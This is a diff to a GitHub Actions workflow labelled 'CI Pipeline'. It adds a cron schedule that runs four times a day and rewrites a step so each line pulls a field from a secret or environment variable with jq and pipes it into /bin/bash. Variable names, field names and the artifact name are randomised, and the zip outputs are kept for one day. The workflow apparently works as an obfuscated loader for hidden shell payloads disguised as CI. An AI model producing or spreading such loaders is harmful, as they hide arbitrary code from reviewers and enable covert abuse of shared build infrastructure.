@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '27 1,7,13,19 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -13,17 +15,16 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          udg0: ${{ secrets.udg0 }}
+          txsk8907: ${{ secrets.txsk8907 }}
         run: |
-          printf '%s' "$udg0" | jq -r .vomk21 | /bin/bash
-          echo $zvb6778 | jq -r .oies40417 | /bin/bash
-          echo $ltig0501 | jq -r .snqkk02 | /bin/bash
-          printf '%s' "$p9" | jq -r .iefx8 | /bin/bash
-          printf '%s' "$wf34" | jq -r .kuy1052 | /bin/bash
+          printf '%s' "$txsk8907" | jq -r .ropzr7456 | /bin/bash
+          echo $mebd3 | jq -r .lhw1533 | /bin/bash
+          echo $jupl21413 | jq -r .xkp7 | /bin/bash
+          echo $uc2 | jq -r .alz9 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: nGr8niWd
+          name: qk0dJUUL
           path: "*.zip"
           retention-days: 1
